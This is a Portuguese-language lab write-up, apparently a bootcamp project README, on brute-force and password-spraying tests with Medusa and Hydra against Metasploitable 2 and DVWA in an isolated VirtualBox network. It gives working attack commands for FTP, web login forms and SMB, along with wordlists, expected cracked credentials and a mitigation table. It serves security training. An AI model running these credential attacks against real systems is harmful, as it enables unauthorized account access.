# kali
# Desafio DIO: Auditoria de Força Bruta com Kali Linux e Medusa

## Objetivo do Projeto
Demonstrar a compreensão de ataques de força bruta em serviços de rede (FTP, HTTP formulário web e SMB) utilizando a ferramenta **Medusa** no Kali Linux, em ambiente controlado e isolado (VirtualBox – rede host-only). O projeto inclui configuração do laboratório, execução ética de testes, documentação dos resultados e propostas de mitigação de vulnerabilidades.

**Aviso importante**: Todas as atividades foram realizadas em ambiente de laboratório privado, sem conexão com a internet ou sistemas de terceiros. A execução deste tipo de teste em ambientes não autorizados é ilegal.

## Ambiente Configurado

- **Máquina Atacante**: Kali Linux 2025.x (atualizado)  
  - IP: 192.168.56.101 (exemplo – adapte ao seu)  
  - Ferramentas: Medusa, Nmap, wordlists padrão (/usr/share/wordlists/)

- **Máquina Alvo**: Metasploitable 2  
  - IP: 192.168.56.102 (exemplo)  
  - Serviços explorados:  
    - FTP (vsftpd 2.3.4) – usuário msfadmin  
    - SMB (Samba) – enumeração e password spraying  
  - DVWA (Damn Vulnerable Web Application) instalado manualmente no Metasploitable 2 ou em outra VM (ex.: 192.168.56.103)  
    - Security level: Low (para demonstração inicial)

- Rede: Host-Only Adapter (VirtualBox) – isolada

## Preparação – Wordlists Utilizadas

Criei/adaptei wordlists simples para fins didáticos:

- **users.txt** (enumeração / password spraying)
msfadmin
admin
user
test
guest
text- **passwords-short.txt** (senhas fracas comuns + default)
msfadmin
password
123456
admin
letmein
qwerty
text- Rockyou.txt (parcial) ou /usr/share/wordlists/rockyou.txt (para testes mais completos – cuidado com o tempo de execução)

## 1. Reconhecimento Inicial (Nmap)

```bash
nmap -sV -sC -O 192.168.56.102
Principais portas identificadas (exemplo típico do Metasploitable 2):

21/tcp   open  ftp     vsftpd 2.3.4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  microsoft-ds Samba smbd 3.X - 4.X
80/tcp   open  http    Apache httpd ...

2. Ataque de Força Bruta – FTP
Comando executado:
Bashmedusa -h 192.168.56.102 -u msfadmin -P passwords-short.txt -M ftp -t 4 -f
Resultado esperado (credencial default do Metasploitable 2):
textACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin
Validação:

Acesso via ftp 192.168.56.102 → login bem-sucedido

3. Ataque de Força Bruta – Formulário Web (DVWA – Brute Force – Low)
Pré-requisitos:

Logado no DVWA (admin/password)
Security = Low
Página: http://192.168.56.103/DVWA/vulnerabilities/brute/

Observação: Medusa possui módulo http, mas para formulários POST com mensagem de erro específica, Hydra é mais comum. Para fins didáticos, segue exemplo com Medusa (HTTP Basic ou ajustado):
Bashmedusa -h 192.168.56.103 -u admin -P passwords-short.txt -M http -m FORM-POST:"/DVWA/login.php" -m FORM:"username=^USER^&password=^PASS^&Login=Login" -m DENY-SIGNAL:"incorrect" -T 1
Alternativa recomendada (mais estável – Hydra):
Bashhydra -l admin -P passwords-short.txt 192.168.56.103 http-post-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect." -t 4
Resultado: Credencial encontrada rapidamente em nível Low.
4. Password Spraying + Enumeração – SMB
Enumeração de usuários compartilhamentos (opcional – smbclient):
Bashsmbclient -L //192.168.56.102 -N
Password spraying com Medusa (um password comum em vários usuários):
Bashmedusa -h 192.168.56.102 -U users.txt -p msfadmin -M smbnt -t 5 -e ns

-e ns: testa também senha em branco e username = password

Resultado esperado: Sucesso com msfadmin:msfadmin
Medidas de Mitigação Recomendadas



































VulnerabilidadeRecomendação PrincipalImpacto na PrevençãoSenhas default / fracasPolítica de senhas fortes + expiração periódicaEvita sucesso em ataques rápidosFTP anônimo ou sem criptografiaDesativar FTP → usar SFTP / FTPSElimina exposição de credenciaisFormulário web sem proteçãoCAPTCHA, rate limiting, lockout após 5 tentativasBloqueia ataques automatizadosSMB exposto sem autenticação forteDesativar SMBv1, usar NTLMv2 ou Kerberos, firewallReduz superfície de ataqueAusência de monitoramentoImplementar fail2ban, IDS/IPS, logs centralizadosDetecta e bloqueia tentativas em tempo real
